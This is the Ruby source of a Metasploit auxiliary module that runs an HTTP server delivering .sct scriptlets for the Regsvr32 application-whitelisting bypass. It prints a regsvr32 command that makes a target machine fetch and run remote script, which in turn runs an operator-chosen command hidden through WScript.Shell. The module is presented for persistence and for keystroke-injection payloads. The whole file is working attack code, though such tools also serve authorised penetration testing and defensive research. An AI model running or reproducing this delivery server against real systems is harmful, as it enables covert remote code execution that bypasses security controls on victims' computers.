##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Regsvr32.exe (.sct) Command Delivery Server',
      'Description'  => %q(
        This module uses the Regsvr32.exe Application Whitelisting Bypass technique as a way to run a command on
        a target system. The major advantage of this technique is that you can execute a static command on the target
        system and dynamically and remotely change the command that will actually run (by changing the value of CMD).
        This is useful when combined with persistence methods (e.g., a recurring scheduled task) or when flexibility
        is needed through the use of a single command (e.g., as Rubber Ducky payload).
      ),
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          'Casey Smith',  # AppLocker bypass research and vulnerability discovery (@subTee)
          'Trenton Ivey', # MSF Module (kn0)
          'mubix',        # Auxiliary module idea
        ],
      'References'     =>
        [
          ['URL', 'http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html']
        ]
    ))

    register_options(
      [
        OptString.new('CMD',[false, 'The command to execute',''])
      ])
  end


  def run
    exploit
  end


  def primer
    print_status("Run the following command on the target machine:")
    print_line("regsvr32 /s /n /u /i:#{get_uri} scrobj.dll")
  end

  def on_request_uri(cli, _request)
    print_status("Handling request from #{cli.peerhost}")
    data = gen_sct_file(datastore['CMD'])
    send_response(cli, data, 'Content-Type' => 'text/plain')
  end


  def rand_class_id
    "#{Rex::Text.rand_text_hex 8}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 12}"
  end


  def gen_sct_file(command)
    # If the provided command is empty, a correctly formatted response is still needed (otherwise the system raises an error).
    if command == ''
      return %{<?XML version="1.0"?><scriptlet><registration progid="#{Rex::Text.rand_text_alphanumeric 8}" classid="{#{rand_class_id}}"></registration></scriptlet>}
    # If a command is provided, tell the target system to execute it.
    else
      return %{<?XML version="1.0"?><scriptlet><registration progid="#{Rex::Text.rand_text_alphanumeric 8}" classid="{#{rand_class_id}}"><script><![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("#{command}",0);]]></script></registration></scriptlet>}
    end
  end
end
